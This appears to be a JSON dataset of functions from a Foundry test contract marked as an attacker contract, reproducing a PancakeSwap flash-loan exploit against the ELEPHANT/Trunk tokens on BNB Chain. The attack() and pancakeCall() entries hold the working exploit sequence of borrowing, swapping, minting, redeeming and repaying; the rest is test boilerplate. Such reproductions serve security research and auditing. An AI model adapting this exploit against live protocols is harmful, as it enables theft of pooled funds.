[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "BUSDT_WBNB_Pair",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "BUSD_USDT_Pair",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "attack",
    "original_code": "    function attack() public {\n        wbnb.withdraw(100_000 ether);\n\n        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 100_000 ether}(\n            0, path_1, address(this), block.timestamp\n        );\n\n        uint256 balance_elephant = elephant.balanceOf(address(this));\n\n        emit log_named_uint(\"The elephant after swapping\", balance_elephant / 1e9);\n\n        not_verified.mint(90_000_000 ether);\n\n        uint256 balance_Trunk = Trunk.balanceOf(address(this));\n\n        emit log_named_uint(\"The Trunk after minting\", balance_Trunk / 1e18);\n\n        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            balance_elephant, 0, path_2, address(this), block.timestamp\n        );\n\n        emit log_named_uint(\"The WBNB Balance after swaping\", wbnb.balanceOf(address(this)) / 1e18);\n\n        balance_Trunk = Trunk.balanceOf(address(this));\n\n        not_verified.redeem(balance_Trunk);\n\n        emit log_named_uint(\"The BUSD after redeeming\", busd.balanceOf(address(this)) / 1e18);\n\n        uint256 b3 = elephant.balanceOf(address(this));\n\n        emit log_named_uint(\"The elephant after redeeming\", b3 / 1e9);\n\n        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(b3, 0, path_2, address(this), block.timestamp);\n\n        emit log_named_uint(\"The WBNB Balance before paying back\", wbnb.balanceOf(address(this)) / 1e18);\n\n        wbnb.transfer(BUSDT_WBNB_Pair, 100_300 ether);\n\n        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            wbnb.balanceOf(address(this)), 0, path_4, address(this), block.timestamp\n        );\n\n        emit log_named_uint(\"The BUSD before paying back\", busd.balanceOf(address(this)) / 1e18);\n\n        busd.transfer(BUSD_USDT_Pair, 90_300_000 ether);\n\n        emit log_named_uint(\"The BUSD after paying back\", busd.balanceOf(address(this)) / 1e18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "elephant_wbnb_Pair",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "pancakeCall",
    "original_code": "    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n        sender;\n        data;\n        amount0;\n        amount1;\n\n        if (msg.sender == BUSDT_WBNB_Pair) {\n            IPancakePair(BUSD_USDT_Pair).swap(0, 90_000_000 ether, address(this), \"0x00\");\n        } else {\n            attack();\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        IPancakePair(BUSDT_WBNB_Pair).swap(0, 100_000 ether, address(this), \"0x00\");\n    }\n\n",
    "description": ""
  }
]